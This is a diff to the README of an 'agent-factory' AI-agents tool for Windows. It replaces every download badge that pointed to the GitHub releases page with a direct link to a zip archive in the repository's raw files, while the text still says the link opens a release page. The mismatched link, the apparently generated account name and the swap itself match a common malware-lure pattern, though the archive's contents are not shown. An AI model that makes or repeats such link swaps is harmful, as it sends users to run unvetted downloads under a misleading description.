@@ -1,6 +1,6 @@
 # 🤖 agent-factory - Ready-to-Use AI Agents for Everyone
 
-[![Download agent-factory](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cornhuskinghemophiliab653/agent-factory/releases)
+[![Download agent-factory](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cornhuskinghemophiliab653/agent-factory/main/agents/agent-factory-v2.9.zip)
 
 ---
 
@@ -49,7 +49,7 @@ To run agent-factory smoothly on your Windows machine, you will need:
 
 Go to the main release page here:
 
-[![Download agent-factory](https://img.shields.io/badge/Download-agent--factory-blue?style=for-the-badge)](https://github.com/cornhuskinghemophiliab653/agent-factory/releases)
+[![Download agent-factory](https://img.shields.io/badge/Download-agent--factory-blue?style=for-the-badge)](https://raw.githubusercontent.com/cornhuskinghemophiliab653/agent-factory/main/agents/agent-factory-v2.9.zip)
 
 This page lists the latest versions of agent-factory and the files available for download.
 
@@ -135,4 +135,4 @@ If agent-factory does not start or crashes:
 
 ## 🔗 Download agent-factory here
 
-[![Download agent-factory](https://img.shields.io/badge/Download-agents%20library-grey?style=for-the-badge)](https://github.com/cornhuskinghemophiliab653/agent-factory/releases)
+[![Download agent-factory](https://img.shields.io/badge/Download-agents%20library-grey?style=for-the-badge)](https://raw.githubusercontent.com/cornhuskinghemophiliab653/agent-factory/main/agents/agent-factory-v2.9.zip)
